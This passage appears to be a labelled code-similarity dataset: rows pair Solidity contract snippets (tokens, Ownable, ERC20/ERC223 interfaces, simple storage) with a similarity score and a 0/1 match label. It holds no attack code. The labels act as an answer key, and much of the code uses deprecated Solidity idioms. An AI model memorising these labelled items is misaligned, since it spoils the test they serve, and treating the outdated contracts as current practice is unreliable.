        name = tokenName;                                   
        symbol = tokenSymbol;                               
        decimals = decimalUnits;                            
        if (!msg.sender.send(msg.value)) throw;                         
    }

    
    function transfer(address _to, uint256 _value) {
        if (balanceOf[msg.sender] < _value) throw;           
        if (balanceOf[_to] + _value < balanceOf[_to]) throw; 
        balanceOf[msg.sender] -= _value;                     
        balanceOf[_to] += _value;                            
        Transfer(msg.sender, _to, _value);                   
    }

    
    function approve(address _spender, uint256 _value)
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        tokenRecipient spender = tokenRecipient(_spender);
        return true;
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        returns (bool success) {    
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }

    
    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {
        if (balanceOf[_from] < _value) throw;                 
        if (balanceOf[_to] + _value < balanceOf[_to]) throw;  
        if (_value > allowance[_from][msg.sender]) throw;   
        balanceOf[_from] -= _value;                          
        balanceOf[_to] += _value;                            
        allowance[_from][msg.sender] -= _value;
        Transfer(_from, _to, _value);
        return true;
    }

    
    function () {
        throw;     
    }
}",0.964873716,"contract token {
    
    string public standard = &#39;Token 0.1&#39;;
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;

    
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event FundTransfer(address backer, uint amount, bool isContribution);

    
    function token(
        uint256 initialSupply,
        string tokenName,
        uint8 decimalUnits,
        string tokenSymbol
        ) {
        balanceOf[msg.sender] = initialSupply;              
        totalSupply = initialSupply;                        
        name = tokenName;                                   
        symbol = tokenSymbol;                               
        decimals = decimalUnits;                            
    }

    
    function transfer(address _to, uint256 _value) {
        if (balanceOf[msg.sender] < _value) throw;           
        if (balanceOf[_to] + _value < balanceOf[_to]) throw; 
        balanceOf[msg.sender] -= _value;                     
        balanceOf[_to] += _value;                            
        Transfer(msg.sender, _to, _value);                   
    }

    
    function approve(address _spender, uint256 _value)
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        returns (bool success) {    
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }

    
    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {
        if (balanceOf[_from] < _value) throw;                 
        if (balanceOf[_to] + _value < balanceOf[_to]) throw;  
        if (_value > allowance[_from][msg.sender]) throw;   
        balanceOf[_from] -= _value;                          
        balanceOf[_to] += _value;                            
        allowance[_from][msg.sender] -= _value;
        Transfer(_from, _to, _value);
        return true;
    }

    
    function () {
        throw;     
    }
}",1,,,,,
"contract owned {
  function owned() { owner = msg.sender; }
  address owner;

  
  
  
  
  modifier onlyowner { if (msg.sender == owner) _ }
}",0.962814181,"contract Owned {
    address owner;

    modifier onlyowner() {
        if (msg.sender == owner) {
            _;
        }
    }

    function Owned() {
        owner = msg.sender;
    }
}",1,,,,,
"contract MyToken {
        function mint(address _to, uint256 _amount) returns (bool);
    }",0.91435464,"contract MintableToken {
    function mint(address _to, uint256 _amount) returns (bool);
}",1,,,,,
"contract HelloWorld {

    function hi() public pure returns (string memory) {
        return (""Hello World"");
    } 
}",0.946805449,"contract HelloWorld{

    function Hello() public pure returns (string memory){

        return (""Hello World"");

    }

}",0,,,,,
"contract Ownable {
    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address _new_owner) public onlyOwner {
        require(_new_owner != address(0));
        owner = _new_owner;
    }
}",0.932466317,"contract Ownable {

  address public owner;



  constructor() public {

      owner = msg.sender;

  }



  modifier onlyOwner() {

      require(msg.sender == owner);

      _;

  }



  function transferOwnership(address newOwner)public onlyOwner {

      if (newOwner != address(0)) {

        owner = newOwner;

      }

  }



}",1,,,,,
"contract ERC20 {
    function transferFrom(address _from, address _to, uint _value) returns (bool success);
}",0.965135229,"contract ERC20 {



  function transferFrom(address _from, address _to, uint256 _value) returns (bool success);

}",1,,,,,
"contract Sampleapp {
    uint storedData;

    function set(uint x) public {
        storedData = x;
    }

    function get() public view returns (uint) {
        return storedData;
    }
}",0.942113868,"contract SimpleStorage

{

    uint storedData;

    

    function set(uint x) public

    {

        storedData = x;

    }



    function get() public view returns (uint)

    {

        return storedData;

    }

}",1,,,,,
"contract Ownable {

    address public owner;

    modifier onlyOwner  {
        require(msg.sender == owner);
        _;
    }

    constructor () internal {
        owner = msg.sender;
    }
}",0.941578701,"contract Ownable {

  address public owner;



  constructor() public {

    owner = msg.sender;

  }



  modifier onlyOwner() {

    require(msg.sender == owner);

    _;

  }

}",0,,,,,
"contract Owned {
    address public owner; 

    

    
    constructor() public {
        owner = msg.sender;
    }

    
}",0.946501195,"contract Ownable {



  address public owner;



  constructor() public {

    owner = msg.sender;

  }



}",0,,,,,
"contract YourToken{
        function transferFrom(address _from, address _to, uint _value) returns (bool success);
        function approve(address _spender, uint _value) returns (bool success);
        function balanceOf(address _owner) constant returns (uint balance);
    }",0.915317418,"contract TokensContract {

    function balanceOf(address who) public constant returns (uint256);

    function transferFrom(address _from, address _to, uint _value) returns (bool success);

    function approve(address _spender, uint _value) returns (bool success);

}",1,,,,,
"contract ERC20TokenInterface {

    uint256 public totalSupply;

    function balanceOf(address _owner) public view returns (uint256 balance);

    function transfer(address _to, uint256 _value) public returns (bool success);

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);

    function approve(address _spender, uint256 _value) public returns (bool success);

    function allowance(address _owner, address _spender) public view returns (uint256 remaining);

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}",0.987675182,"contract EIP20Interface {
    
    
    uint256 public totalSupply;

    
    
    function balanceOf(address _owner) public view returns (uint256 balance);

    
    
    
    
    function transfer(address _to, uint256 _value) public returns (bool success);

    
    
    
    
    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);

    
    
    
    
    function approve(address _spender, uint256 _value) public returns (bool success);

    
    
    
    function allowance(address _owner, address _spender) public view returns (uint256 remaining);

    
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}",1,,,,,
"contract ERC223Interface {
    uint public totalSupply;
    function balanceOf(address who) constant returns (uint);
    function transfer(address to, uint value);
    function transfer(address to, uint value, bytes data);
    event Transfer(address indexed from, address indexed to, uint value, bytes data);
}",0.955526327,"contract ERC223Interface {

    function balanceOf(address who) public constant returns (uint);

    function transfer(address to, uint value) public;

    function transfer(address to, uint value, bytes data) public;

    event Transfer(address indexed from, address indexed to, uint value, bytes data);

}",0,,,,,
"contract Token {
  function mint(address _to, uint _amount) public returns (bool);

  
}",0.912484178,"contract Token {
    function transfer(address to, uint amount) public returns (bool);
}",1,,,,,
"contract SimpleToken is ERC20 {

  string public constant name = ""SimpleToken"";
  string public constant symbol = ""SIM"";
  uint8 public constant decimals = 18;

  uint256 public constant INITIAL_SUPPLY = 10000 * (10 ** uint256(decimals));

  
  constructor() public {
    _mint(msg.sender, INITIAL_SUPPLY);
  }

}",0.917062162,"contract BitQueen is ERC20 {

  string public constant name = ""BitQueen"";

  string public constant symbol = ""BQ"";

  uint8 public constant decimals = 18;

  uint256 public constant INITIAL_SUPPLY = 21000000000000 * (10 ** uint256(decimals));

  constructor() public {

    _mint(msg.sender, INITIAL_SUPPLY);

  }



}",1,,,,,
"contract ERC223Receiver
{
    function tokenFallback(address _from, uint _value, bytes _data);
}",0.914566877,"contract ContractReceiver {
    function tokenFallback(address _from, uint _value, bytes _data);
}",1,,,,,
"contract test{
    function multiply(uint a) public pure returns(uint d){
        return a*7;
    }
}",0.949444408,contract test { function multiply(uint a) public pure returns(uint d) {   return a * 7;   } },,,1,,,
